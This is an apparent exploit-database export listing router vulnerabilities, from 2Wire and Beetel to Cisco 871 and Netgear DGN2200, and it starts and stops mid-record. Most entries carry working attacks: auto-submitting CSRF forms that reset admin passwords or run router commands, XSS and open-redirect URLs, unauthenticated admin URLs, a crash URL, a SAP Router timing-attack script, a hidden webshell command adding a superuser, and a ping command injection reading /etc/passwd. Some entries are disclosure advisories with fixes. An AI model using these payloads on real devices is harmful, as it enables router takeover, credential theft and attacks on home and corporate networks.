http://gateway.example.net/xslt?PAGE=CD35_SETUP_01_POST&password1=*Ax512*&password2=*Ax512*","Multiple 2Wire routers are prone to an access-validation vulnerability because they fail to adequately authenticate users before performing certain actions.
Unauthenticated attackers can leverage this issue to change the router's administrative password. Successful attacks will completely compromise affected devices.
2Wire routers prior to Firmware version 5.29.135.5 are vulnerable.
The following example URIs are available:"
2014-04-30,WebApps,Hardware,shyamkumar somana,Beetel 450TC2 Router,Cross-Site Request Forgery (Admin Password),"# Exploit Title: Beetel 450TC2 Router Admin Password Cross Site Request
# Date: 30/04/2014
# Exploit Author: shyamkumar somana
# Vendor Homepage: www.beetel.in
# Version: 450TC2 - Firmware version : TX6-0Q-005_retail
# Tested on: Windows 8
#Beetel 450TC2 Router is vulnerable for cross site request forgery
#Affected Resource/Form : Forms/tools_admin_1
#Exploit:","​​<!--
Forgery Vulnerability
vulnerability in change password page.
Post Request:
POST /Forms/tools_admin_1 HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:29.0) Gecko/20100101
Firefox/29.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.1.1/maintenance/tools_admin.htm
Authorization: Basic YWRtaW46c3lhbXNvbWFuYQ==
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 60
uiViewTools_Password=NEW_PASSWORD&uiViewTools_PasswordConfirm=NEW_PASSWORD
<html>
<body>
<form action=""http://192.168.1.1/Forms/tools_admin_1"" method=""POST"">
<input type=""hidden"" name=""uiViewTools_Password"" value=""123456789"" />
<input type=""hidden"" name=""uiViewTools_PasswordConfirm"" value=""123456789"" />
<input type=""submit"" value=""Submit form"" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>"
2014-04-17,Remote,Hardware,Core Security,SAP Router,Timing Attack Password Disclosure,"http://corelabs.coresecurity.com/
http://www.coresecurity.com/advisories/sap-router-password-timing-attack
https://service.sap.com/sap/support/notes/1986895
#!/usr/bin/python
## ===========
## pysap - Python library for crafting SAP's network protocols packets
## Copyright (C) 2014 Core Security Technologies
## The library was designed and developed by Martin Gallo from the Security
## Consulting Services team of Core Security Technologies.
## This program is free software; you can redistribute it and/or
## modify it under the terms of the GNU General Public License
## as published by the Free Software Foundation; either version 2
## of the License, or (at your option) any later version.
## This program is distributed in the hope that it will be useful,
## but WITHOUT ANY WARRANTY; without even the implied warranty of
## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
## GNU General Public License for more details.
# Standard imports
# External imports
# Custom imports
# Set the verbosity to 0
# Command line options parser
http://corelabs.coresecurity.com/index.php?module=Wiki&action=view&type=tool&name=pysap""""""
# Retrieve the version of the remote SAP Router
# Write the time to the output file
# Main function
# Initiate the connection
# Retrieve the router version used by the server if not specified
http://help.sap.com/saphelp_nw74/helpdata/en/48/7612ed5ca5055ee10000000a42189b/content.htm?frameset=/en/ea/214d2aafaa43feaee78375cb16552f/frameset.htm.
http://help.sap.com/saphelp_nw74/helpdata/en/48/6c7a3fc1504e6ce10000000a421937/content.htm?frameset=/en/ea/214d2aafaa43feaee78375cb16552f/frameset.htm
https://service.sap.com/sap/support/notes/1986895.
http://corelabs.coresecurity.com.
http://www.coresecurity.com.
http://creativecommons.org/licenses/by-nc-sa/3.0/us/
http://www.coresecurity.com/files/attachments/core_security_advisories.asc.","Core Security - Corelabs Advisory
SAP Router Password Timing Attack
1. *Advisory Information*
Title: SAP Router Password Timing Attack
Advisory ID: CORE-2014-0003
Advisory URL:
Date published: 2014-04-15
Date of last update: 2014-03-06
Vendors contacted: SAP
Release mode: Coordinated release
2. *Vulnerability Information*
Class: Information Exposure Through Timing Discrepancy [CWE-208]
Impact: Security bypass
Remotely Exploitable: Yes
Locally Exploitable: No
CVE Name: CVE-2014-0984
3. *Vulnerability Description*
SAP Router [1]  is an application-level gateway used to
connect systems in a SAP infrastructure. A vulnerability
have been found in SAP Router that could allow an unauthenticated
remote attacker to obtain passwords used to protect route entries
by a
timing side-channel attack.
4. *Vulnerable Packages*
. SAP Router release 721 patch level 117.
. SAP Router release 720 patch level 411.
. SAP Router release 710 patch level 029.
. Other versions are probably affected too, but they were not checked.
5. *Vendor Information, Solutions and Workarounds*
SAP released the security note
regarding these issues. Contact SAP for further information.
Martin Gallo proposed the following actions to mitigate the
impact of the vulnerabilities:
1. Disable the use of passwords on the Route Permission Table [2].
2. Enforce the use of SNC (Secure Network Communications) as an
authentication mechanism for securing routes.
6. *Credits*
This vulnerability was discovered and researched by Martin Gallo
from Core
Security Consulting Services. The publication of this advisory was
coordinated by Fernando Miranda from Core Advisories Team.
7. *Technical Description / Proof of Concept Code*
SAP Router permits and/or forbids networks connections based on a
Route Permission Table [2]. Entries in the
Route Permission Table can have a password. If a password is
specified
for a given entry in the Route Permission Table, SAP Router checks
whether
the user-supplied password matches with the one in the Route
Permission
Table entry before permitting a connection.
The vulnerable function 'passwordCheck'
performs a non-constant time string comparison for checking the
user-supplied password against the on in the Route Permission Table.
On the first non-matched character, the string comparison function
immediately interrupts the evaluation cycle, which may let an
attacker perform timing attacks.
The following snippet shows an excerpt of the vulnerable code
within the
'passwordCheck' function:
.text:0000000140005BE0 loc_140005BE0:                          ; CODE
XREF: passwordCheck+191j
.text:0000000140005BE0                 movzx   ecx, byte ptr [rdi] ; rdi
points to the routtab password
.text:0000000140005BE3                 movzx   eax, byte ptr [rdi+rsi] ;
rdi+rsi points to the user-supplied password
.text:0000000140005BE7                 sub     ecx, eax
.text:0000000140005BE9                 jnz     short loc_140005BF3 ;
password check failed
.text:0000000140005BEB                 add     rdi, 1
.text:0000000140005BEF                 test    eax, eax
.text:0000000140005BF1                 jnz     short loc_140005BE0
.text:0000000140005BF3
.text:0000000140005BF3 loc_140005BF3:                          ; CODE
XREF: passwordCheck+189j
.text:0000000140005BF3                 test    ecx, ecx
.text:0000000140005BF5                 jz      short loc_140005C3F
.text:0000000140005BF7                 cmp     cs:trace_level, 1
.text:0000000140005BFE                 jl      short loc_140005C38
.text:0000000140005C00                 call    DpLock
.text:0000000140005C05                 mov     rcx, cs:qword_140273BC0
.text:0000000140005C0C                 lea     r8, aPasswordcheck ;
""passwordCheck""
.text:0000000140005C13                 lea     rdx, aSPasswordCheck ;
""%s: password check failed\n""
.text:0000000140005C1A                 mov     cs:dword_1401ADAA4, 1
.text:0000000140005C24                 call    DpTrace
.text:0000000140005C29
.text:0000000140005C29 loc_140005C29:                          ; CODE
XREF: passwordCheck+16Fj
.text:0000000140005C29                 mov     cs:dword_1401ADAA4, 2
.text:0000000140005C33                 call    DpUnlock
.text:0000000140005C38
.text:0000000140005C38 loc_140005C38:                          ; CODE
XREF: passwordCheck+135j
.text:0000000140005C38                                         ;
passwordCheck+19Ej
.text:0000000140005C38                 mov     eax, 0FFFFFFA2h
.text:0000000140005C3D                 jmp     short loc_140005C41
.text:0000000140005C3F ;
.text:0000000140005C3F
.text:0000000140005C3F loc_140005C3F:                          ; CODE
XREF: passwordCheck+12Cj
.text:0000000140005C3F                                         ;
passwordCheck+174j ...
.text:0000000140005C3F                 xor     eax, eax        ;
password check succeeded
7.1. *Proof of Concept*
import logging
from optparse import OptionParser, OptionGroup
import fau_timer
from scapy.config import conf
from scapy.supersocket import socket
from pysap.SAPNI import SAPNI, SAPNIStreamSocket
from pysap.SAPRouter import SAPRouter, router_is_control
conf.verb = 0
def parse_options():
description = \
""""""This example script connects with a SAP Router service and makes an
information request using a provided password. It then records the
time the remote service takes to respond to the request. Further
analysis
of the time records could be performed in order to identify whether the
server is vulnerable to a timing attack on the password check.
epilog = \
""""""pysap -
usage = ""Usage: %prog [options] -d <remote host>""
parser = OptionParser(usage=usage, description=description,
epilog=epilog)
target = OptionGroup(parser, ""Target"")
target.add_option(""-d"", ""--remote-host"", dest=""remote_host"",
help=""Remote host [%default]"", default=""127.0.0.1"")
target.add_option(""-p"", ""--remote-port"", dest=""remote_port"",
type=""int"", help=""Remote port [%default]"", default=3299)
target.add_option(""--router-version"", dest=""router_version"",
type=""int"", help=""SAP Router version to use [retrieve from the remote
SAP Router]"")
parser.add_option_group(target)
misc = OptionGroup(parser, ""Misc options"")
misc.add_option(""-t"", ""--tries"", dest=""tries"", default=10,
type=""int"", help=""Amount of tries to make for each length [%default]"")
misc.add_option(""--password"", dest=""password"", default=""password"",
help=""Correct password to test"")
misc.add_option(""-o"", ""--output"", dest=""output"",
default=""output.csv"", help=""Output file [%default]"")
misc.add_option(""-v"", ""--verbose"", dest=""verbose"",
action=""store_true"", default=False, help=""Verbose output [%default]"")
parser.add_option_group(misc)
(options, _) = parser.parse_args()
if not options.remote_host:
parser.error(""Remote host is required"")
return options
def get_router_version(connection):
r = connection.sr(SAPRouter(type=SAPRouter.SAPROUTER_CONTROL,
version=40, opcode=1))
if router_is_control(r) and r.opcode == 2:
return r.version
else:
return None
def try_password(options, password, output=None, k=0):
p = SAPRouter(type=SAPRouter.SAPROUTER_ADMIN,
version=options.router_version)
p.adm_command = 2
p.adm_password = password
p = str(SAPNI() / p)
fau_timer.init()
fau_timer.send_request(options.remote_host, options.remote_port, p,
len(p))
fau_timer.calculate_time()
cpuSpeed = fau_timer.get_speed()
cpuTicks = fau_timer.get_cpu_ticks()
time = fau_timer.get_time()
if options.verbose:
print ""Request time: CPU Speed: %s Hz CPU Ticks: %s Time: %s
nanosec"" % (cpuSpeed, cpuTicks, time)
if output:
output.write(""%i,%s,%s\n"" % (k, password, time))
return time
def main():
options = parse_options()
if options.verbose:
logging.basicConfig(level=logging.DEBUG)
sock = socket.socket()
sock.connect((options.remote_host, options.remote_port))
conn = SAPNIStreamSocket(sock)
print ""[*] Connected to the SAP Router %s:%d"" %
(options.remote_host, options.remote_port)
if options.router_version is None:
options.router_version = get_router_version(conn)
print ""[*] Using SAP Router version %d"" % options.router_version
print ""[*] Checking if the server is vulnerable to a timing attack ...""
with open(options.output, ""w"") as f:
c = 0
for i in range(0, len(options.password) + 1):
password = options.password[:i] + ""X"" *
(len(options.password) - i)
print ""[*] Trying with password (%s) len %d"" % (password,
len(password))
for _ in range(0, options.tries):
try_password(options, password, f, c)
c += 1
if __name__ == ""__main__"":
main()
8. *Report Timeline*
. 2014-02-20:
Initial notification sent to SAP, including technical description
to reproduce the vulnerability. Publication date set to March
11, 2014.
. 2014-02-20:
Vendor notifies that the tracking number 1068415-2014 was
created for this issue.
. 2014-02-28:
Vendor notifies that they will not be able to provide
a fix for the reported issue for the tentative release date,
March 11th,
and ask for delaying the advisory publication.
. 2014-03-03:
Vendor notifies that they currently do not see it as a
vulnerability
and asks for additional technical details.
. 2014-03-05:
Core sends additional information regarding how to exploit this
vulnerability
solving the network letency and other practical issues.
Additional publications
on this topic were also included [3],
[4], [5].
. 2014-03-07:
Vendor notifies that they will make changes for mitigating
timing attacks.
Vendor also notifies that they usually release security fixes
on Patch Days (every second Tuesday per month), and April 8th
or May 13th seems much more realistic dates for releasing fixes.
. 2014-03-26:
Vendor requests pushing the advisory release until May 13th.
. 2014-04-03:
Core re-schedules the advisory publication for May 13th.
. 2014-03-11:
First release date missed.
. 2014-03-07:
Core re-schedules the advisory publication for April 8th.
. 2014-03-13:
Core sends a Proof of Concept and aditional technical information.
. 2014-04-07:
SAP notifies that they have released the security note 1986895
[6] on April Patch Day 2014.
. 2014-04-09:
Core notifies that the advisory is going to be re-schedule for
the 15 of April.
. 2014-04-15:
Advisory CORE-2014-0003 published.
9. *References*
[1]
[2]
[3] http://citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.65.9811
[4] http://www.youtube.com/watch?v=idjDiBtu93Y&feature=related
[5] http://events.ccc.de/congress/2011/Fahrplan/attachments/2021_Slides
[6]
SAP security note 1986895
10. *About CoreLabs*
CoreLabs, the research center of Core Security Technologies, is
charged with anticipating
the future needs and requirements for information security
technologies.
We conduct our research in several important areas of computer security
including system vulnerabilities, cyber attack planning and simulation,
source code auditing, and cryptography. Our results include problem
formalization, identification of vulnerabilities, novel solutions and
prototypes for new technologies. CoreLabs regularly publishes security
advisories, technical papers, project information and shared software
tools for public use at:
11. *About Core Security Technologies*
Core Security Technologies enables organizations to get ahead of threats
with security test and measurement solutions that continuously identify
and demonstrate real-world exposures to their most critical assets. Our
customers can gain real visibility into their security standing, real
validation of their security controls, and real metrics to more
effectively secure their organizations.
Core Security's software solutions build on over a decade of trusted
research and leading-edge threat expertise from the company's Security
Consulting Services, CoreLabs and Engineering groups. Core Security
Technologies can be reached at +1 (617) 399-6980 or on the Web at:
12. *Disclaimer*
The contents of this advisory are copyright
(c) 2014 Core Security Technologies and (c) 2014 CoreLabs,
and are licensed under a Creative Commons
Attribution Non-Commercial Share-Alike 3.0 (United States) License:
13. *PGP/GPG Keys*
This advisory has been signed with the GPG key of Core Security
Technologies
advisories team, which is available for download at"
2014-04-08,Remote,Hardware,Juan Manuel Garcia,Halon Security Router (SR) 3.2-winter-r1,Multiple Vulnerabilities,"http://sr.demo.halon.se/commands/logviewer/?log=vic0';</script><script>alert(1)</script>
http://sr.demo.halon.se/fileviewer/?file="";</script><script>alert(1)</script>
http://sr.demo.halon.se/system/graphs/?graph='+alert(1)+'
http://sr.demo.halon.se/commands/?command='+alert(1)+'
http://sr.demo.halon.se/system/users/?id='+alert(1)+'
http://sr.demo.halon.se/config/?uri='+alert(1)+'
http://sr.demo.halon.se/cluster/?switch_to=&uri=http://itforce.tk
http://sr.demo.halon.se/config/?checkout=17&uri=http://itforce.tk
www.itforce.tk","ADVISORY INFORMATION
Advisory Name: Multiple Security Vulnerabilities in Halon Security Router
Date published: 2014-04-07
Vendors contacted: Halon Security (http://www.halon.se)
Researcher: Juan Manuel Garcia (http://www.linkedin.com/in/juanmagarcia)
VULNERABILITIES INFORMATION
Vulnerabilities:
1. Reflected Cross-Site Scripting (XSS) {OWASP Top 10 2013-A3}
2. Cross-site Request Forgery (CSRF) {OWASP Top 10 2013-A8}
3. Open Redirect {OWASP Top 10 2013-A10}
Severities:
1. Reflected XSS: Medium - CVSS v2 Base Score: 5.5 (AV:N/AC:L/Au:S/C:P/I:P/A:N)
2. CSRF: High - CVSS v2 Base Score: 6.5 (AV:N/AC:L/Au:S/C:P/I:P/A:P)
3. Open Redirect: High - CVSS v2 Base Score: 6.5 (AV:N/AC:L/Au:S/C:P/I:P/A:P)
Affected Applications: Security router (SR) v3.2-winter-r1 and earlier.
Affected Platforms: Software, virtual and hardware
Local / Remote: Remote
Vendor Status: Patched
VULNERABILITIES DESCRIPTION
1. Reflected XSS: https://www.owasp.org/index.php/Cross-site_Scripting_%28XSS%29
2. CSRF: https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29
3. Open Redirect: https://www.owasp.org/index.php/Open_redirect
TECHNICAL DESCRIPTION AND PROOF OF CONCEPTS
1- Reflected XSS:
At least the following parameters are not properly sanitized:
Parameter: log
Parameter: file
Parameter: graph
Parameter: command
Parameter: id
Parameter: uri
Other parameters of the application might also be affected.
2- CSRF:
At least the following functions are vulnerable:
Add user: http://xxx.xxx.xxx.xxx/system/users/?add=user
<html>
<body>
<form method=""POST"" name=""form0"" action=""http://localhost:80/system/users/?add=user"">
<input type=""hidden"" name=""checkout"" value=""17""/>
<input type=""hidden"" name=""apply"" value=""""/>
<input type=""hidden"" name=""id"" value=""""/>
<input type=""hidden"" name=""old_user"" value=""""/>
<input type=""hidden"" name=""user"" value=""hacker""/>
<input type=""hidden"" name=""full-name"" value=""ITFORCE H4x0r""/>
<input type=""hidden"" name=""class"" value=""""/>
<input type=""hidden"" name=""password"" value=""1234""/>
<input type=""hidden"" name=""password2"" value=""1234""/>
</form>
</body>
</html>
DNS configuration: http://xxx.xxx.xxx.xxx/network/dns
<html>
<body>
<form method=""POST"" name=""form0"" action=""http://localhost:80/network/dns/"">
<input type=""hidden"" name=""checkout"" value=""17""/>
<input type=""hidden"" name=""apply"" value=""""/>
<input type=""hidden"" name=""name-servers"" value=""8.8.8.8""/>
<input type=""hidden"" name=""search-domain"" value=""""/>
<input type=""hidden"" name=""host-name"" value=""sr.demo.halon.se""/>
</form>
</body>
</html>
Network Configuration: http://xxx.xxx.xxx.xxx/network/basic
Load Balancer Configuration: http://xxx.xxx.xxx.xxx/network/loadbalancer
VPN Configuration: http://xxx.xxx.xxx.xxx/network/vpn
Firewall Configuration: http://xxx.xxx.xxx.xxx/network/firewall
Other functions of the application might also be affected.
3- Open Redirect:
At least the following parameters are not properly sanitized:
Parameter: uri
Parameter: uri
Other parameters of the application might also be affected.
SOLUTION
Install / Upgrade to Security router (SR) v3.2r2
REPORT TIMELINE
2014-04-03: IT Force notifies the Halon team of the vulnerabilities and receives the support ticket ID ZOJ-105816.
2014-04-04: Vendor acknowledges the receipt of the information and informs that the vulnerabilities are going to be resolved in v3.2r2 and updates the SR online demo site.
2014-04-04: IT Force advises Halon on how to resolve the vulnerabilities reported.
2014-04-04: IT Force coordinate with Halon the advisory publication for April 07,2014.
2014-04-07: IT Force published the advisory.
CONTACT INFORMATION"
2008-12-22,Remote,Hardware,Daniel Fernandez Bleda,COMTREND CT-536 / HG-536 Routers,Multiple Remote Vulnerabilities,"source: https://www.securityfocus.com/bid/32975/info
http://www.example.com/scvrtsrv.cmd?action=add&srvName=%3Cscript%3Ealert(%22XSS%22)%3C/script%3E&srvAddr=192.168.1.1&proto=1,&eStart=1,&eEnd=1,&iStart=1,&iEnd http://www,example.com/password.html","COMTREND CT-536 and HG-536 are prone to multiple remote vulnerabilities:
- Multiple unauthorized-access vulnerabilities
- An information-disclosure vulnerability
- Multiple cross-site scripting vulnerabilities
- A denial-of-service vulnerability
- Multiple buffer-overflow vulnerabilities
Attackers can exploit these issues to compromise the affected device, obtain sensitive information, execute arbitrary script code, steal cookie-based authentication credentials, and cause a denial-of-service condition. Other attacks are also possible.
The following firmware versions are vulnerable; additional versions may also be affected:
CT-536 A101-302JAZ-C01_R05
HG-536+ A101-302JAZ-C01_R05 and A101-302JAZ-C03_R14.A2pB021g.d15h"
2008-11-12,Remote,Hardware,Craig Heffner,Belkin F5D8233-4 Wireless N Router (Multiple Scripts),Authentication Bypass,source: https://www.securityfocus.com/bid/32275/info,"The Belkin F5D8233-4 Wireless N Router is prone to multiple vulnerabilities because of a lack of authentication when users access specific administration scripts.
Attackers can exploit these issues to perform administrative functions without authorization.
Belkin F5D8233-4 is vulnerable; other devices may also be affected.
Enable remote management on port 8080: /cgi-bin/system_setting.exe?remote_mgmt_enabled=1&remote_mgmt_port=8080
Restore the router's default factory settings: /cgi-bin/restore.exe
Reboot the router: /cgi-bin/restart.exe
Log in with the default password"": /cgi-bin/login.exe?pws="
2014-03-26,WebApps,Hardware,Groundworks Technologies,Allied Telesis AT-RG634A ADSL Broadband Router,Web Shell,"www.alliedtelesis.com/p-2345.html)
http://creativecommons.org/licenses/by-nc-sa/3.0/us/","*Title:*
Allied Telesis AT-RG634A ADSL Broadband router hidden administrative
unauthenticated webshell.
*Vulnerability Information:*
- CVE: CVE-2014-1982
- Type of Vulnerability:
- CWE-78  : OS Command Injection
- CWE-306 : Missing Authentication for Critical Function
*Affected products:*
- Allied Telesis AT-RG634A ADSL Broadband router. (version 3.3+ and
probably others)
Other products like,
- Allied Telesis iMG624A  (firmware version, 3.5)
- Allied Telesis iMG616LH (firmware version, +2.4)
- Allied Telesis iMG646BD (firmware version, 3.5)
*Vendor:*
- Allied Telesis : http://www.alliedtelesis.com//
has the same vulnerbility, but the vendor reports that the version
3.8.05 of the firmware has already addressed this issue, but we where
unable to test nor confirm this information.
*Security Patches / Workaround:*
- Allied Telesis has noted that the AT-RG634A product is no longer
supported, but gives a workaround
to mitigate the issue.
Configure the device so that only trusted devices can
access the target device using the following command,
""WEBSERVER SET MANAGEMENTIP <ip-address>""
*Short Description:*
The Allied Telesis AT-RG634A ADSL Broadband router has a hidden url
page in their admnistrative HTTP interface capable of executing
commands as admin without requiring any kind of authentication.
*Description:*
""The AT-RG634 is a full-featured, broadband media gateway and router
designed for cost-effective delivery of advanced IP Triple Play voice,
video and data services over an ADSL infrastructure. The RG634
supports Layer 3 functions, including NAT, DMZ, and Stateful
inspection firewall for delivery of revenue-generating services such
as home networking and security services."" (from
The Allied Telesis AT-RG634A ADSL Broadband router has a hidden URL
(/cli.html) page to execute CLI command with admin priviledges,
available by default and without any kind of authentication.
Having as impact a total compromise of the target device.
*Steps to reproduce:*
- Connect via HTTP to the hidden page http://<device IP>/cli.html a
input box is shown, every command typed there will be executed as admin.
Entering the following lines in the hidden page (/cli.html) a new
telnet admin user called ""eviluser"" is added to the system.
>> system add login eviluser system set user eviluser access
>> superuser.
*Credits:*
This security issue was discovered and researched by Sebastian Muniz
(topo), Security Researcher of Groundworks Technologies
(http://www.groundworkstech.com)
*License:*
The contents of this advisory are copyright (c) 2014 Groundworks
Technologies,and are licensed under a Creative Commons Attribution
Non-Commercial Share-Alike 3.0 (United States) License:"
2008-09-17,Remote,Hardware,Jeremy Brown,Cisco 871 Integrated Services Router,Cross-Site Request Forgery (2),source: https://www.securityfocus.com/bid/31218/info,"The Cisco 871 Integrated Services Router is prone to a cross-site request-forgery vulnerability.
Successful exploits can run arbitrary commands on affected devices. This may lead to further network-based attacks.
The 871 Integrated Services Router under IOS 12.4 is vulnerable; other products and versions may also be affected.
<!-- Jeremy Brown [0xjbrown41@gmail.com/http://jbrownsec.blogspot.com] Cisco Router HTTP Administration CSRF Remote Command Execution Universal Exploit #2 Replace ""example.com"" with the IP address of the target router, embed this in a web page and hope for the best. Cisco Admin's + Safari are the best targets ;) --> <html> <body> <body onload=""fdsa.submit();""> <form name=fdsa method=""post"" action=""http://example.com/level/15/exec/-/configure/http""> <input type=hidden name=command value=""alias exec xx xx""> <input type=hidden name=command_url value=""/level/15/exec/-""> <input type=hidden name=new_command_url value=""/level/15/configure/-""> </body> </html>"
2008-09-17,Remote,Hardware,Jeremy Brown,Cisco 871 Integrated Services Router,Cross-Site Request Forgery (1),source: https://www.securityfocus.com/bid/31218/info,"The Cisco 871 Integrated Services Router is prone to a cross-site request-forgery vulnerability.
Successful exploits can run arbitrary commands on affected devices. This may lead to further network-based attacks.
The 871 Integrated Services Router under IOS 12.4 is vulnerable; other products and versions may also be affected.
<!-- Jeremy Brown [0xjbrown41@gmail.com/http://jbrownsec.blogspot.com] Cisco Router HTTP Administration CSRF Remote Command Execution Universal Exploit #1 Replace ""example.com"" with the IP address of the target router, embed this in a web page and hope for the best. Cisco Admin's + Safari are the best targets ;) --> <html> <body> <body onload=""asdf.submit();""> <form name=asdf method=""post"" action=""http://example.com/level/15/exec/-""> <input type=hidden name=command value=""show privilege""> <input type=hidden name=command_url value=""/level/15/exec/-""> </body> </html>"
2014-03-12,WebApps,Hardware,Michael Grifalconi,ZYXEL P-660HN-T1A Router,Authentication Bypass,"# Exploit Title: ZyXEL Router P-660HN-T1A - Login Bypass
# Date: 11/03/2013
# Exploit Author: Michael Grifalconi <NAME.SURNAME@studenti.unimi.it>
# Vendor Homepage: http://www.zyxel.com/products_services/p_660hn_txa_series.shtml?t=p
# Version: 3.40(BYF.5) - (Last avaiable)
http://ROUTER-IP/rpSys.html","If someone is logged on the web interface of the router, the attacker could
bypass the login form by going straigt to the default page of administration.
(The root page will ask for password)
The vulnerability works from any IP address, the router seems to be 'free to access' from any IP
when a legit user is logged in.
You may setup a bot that checks if someone is logged and if so, download the configuration backup
to obtain the password."
2008-06-05,DoS,Hardware,dubingyao,Linksys WRH54G 1.1.3 Wireless-G Router,HTTP Request Denial of Service,"source: https://www.securityfocus.com/bid/29570/info
http://192.168.1.106/./front_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_pagefront_page.asp","Linksys WRH54G Wireless-G Router is prone to a denial-of-service vulnerability because it fails to adequately handle malformed HTTP requests. As a result, memory becomes corrupted and the device's HTTP service will crash.
Successful exploits will deny service to legitimate users. Given the nature of this issue, remote code execution may be possible, but this has not been confirmed.
WRH54G firmware version 1.01.03 is vulnerable; other versions may also be affected."
2014-02-12,WebApps,Hardware,Andrew Horton,Netgear DGN2200 N300 Wireless Router,Multiple Vulnerabilities,# cat /etc/passwd,"Title: Multiple vulnerabilities in NETGEAR N300 WIRELESS ADSL2+ MODEM ROUTER DGN2200
Notification Date:11 February 2014
Affected Vendor:NetGear
Affected Hardware:NetGear DGN2200 N300 Wireless ADSL2+ Modem Router
Firmware Version:V1.0.0.36-7.0.37
Issue Types:* Command Injection
* Cross-site Request Forgery
* UPNP Exploitation through Cross-site Request Forgery
* Insecure FTP Root
* Cannot Disable WPS
* Passwords Stored in Plaintext
* Information Disclosure
* Firmware Update MITM
Advisory Code:AIS-2014-003
Discovered by:Andrew Horton
Issue status:No patch available - product beyond End of Life
Summary
BAE Systems Applied Intelligence researcher, Andrew Horton has identified that the NetGear N300 Wireless ADSL 2+ Modem Router model DGN2200 suffers from multiple vulnerabilities which may be exploited by both local and remote attackers. This enables an attacker to completely compromise the device and stage further attacks against the local network and internet.
NetGear have indicated that this product is beyond its end of life and therefore these vulnerabilities will not be patched. As a result, BAE Systems have delayed release of this advisory for over 12 months to reduce the likelihood of active exploitation.
1.UPNP Vulnerable to CSRF
Requires
Luring an unauthenticated or authenticated user to an attacker-controlled webpage.
Description
The Universal Plug and Play (UPNP) implementation used by NetGear accepts an HTTP POST request as a valid XML request, rendering the UPNP service vulnerable to inter-protocol Cross-Site Request Forgery attacks. This can be used to bypass or alter firewall rules.
The UPNP interface of the router listens on TCP port 5000 and can only be accessed from the LAN side of the device. UPNP requests do not require authentication with passwords. This vulnerability exists because the request is initiated by a user's browser on the LAN side of the device.
Impact
Using this vulnerability, BAE Systems was able to add new firewall rules to enable internet access to the insecure telnet port and the admin web interface.
Proof of concept
The following webpage will make telnet for the router accessible to the internet so that it may be attacked using the GearDog  backdoor (See issue 5). The GearDog backdoor is a known remote access backdoor implemented in many NetGear products. This requires brute-forcing the MAC address.
<html>
<form action=""http://192.168.0.1:5000/Public_UPNP_C3"" method=""post"" ENCTYPE=""text/plain"">
<textarea id=""1"" name=""1""><?xml version=""1.0""?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV=""http://schemas.xmlsoap.org/soap/envelope"" SOAP-ENV:encodingStyle=""http://schemas.xmlsoap.org/soap/encoding/"">
<SOAP-ENV:Body>
.<m:AddPortMapping xmlns:m=""urn:schemas-upnp-org:service:WANIPConnection:1"">
<NewPortMappingDescription>hax3</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration><NewInternalClient>192.168.0.1</NewInternalClient><NewEnabled>1</NewEnabled><NewExternalPort>887</NewExternalPort><NewRemoteHost></NewRemoteHost><NewProtocol>TCP</NewProtocol><NewInternalPort>23</NewInternalPort>
.</m:AddPortMapping>
</SOAP-ENV:Body>
</SOAP-ENV:Envelope>&lt;/textarea&gt;
<input type=""submit"" >
</form>
<script> document.forms[0].submit();</script>
</html>
Note: 192.168.0.1 is the default LAN IP address. Port 23 is the internal port number and port 887 is the external port number to be opened.
Solution
Ensure that UPNP requests sent through HTTP POST parameters are not honoured.
2.Command Execution with Ping
Requires
Authenticated access to the web administration interface.
Description
The ping function available through the web interface is vulnerable to operating system command injection. An attacker with authenticated web user access can gain OS command execution privileges which can be leveraged to backdoor the router, intercept and modify internet traffic, and access connected devices.
Impact
Using this vulnerability, BAE Systems was able to execute arbitrary commands on the underlying Linux operating system  as the root user.
Proof of concept
Example exploitation to obtain a file and directory listing:
POST /ping.cgi HTTP/1.1
Host: 192.168.0.1
Proxy-Connection: keep-alive
Content-Length: 81
Cache-Control: max-age=0
Authorization: Basic YWRtaW46YXBwbGU3ODE=
Origin: http://192.168.0.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: http://192.168.0.1/DIAG_diag.htm
Accept-Encoding: gzip,deflate,sdch
Accept-Language: en-GB,en-US;q=0.8,en;q=0.6
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3
IPAddr1=a&IPAddr2=b&IPAddr3=c&IPAddr4=d&ping=xxxx&ping_IPAddr=|ls
To get an interactive shell,
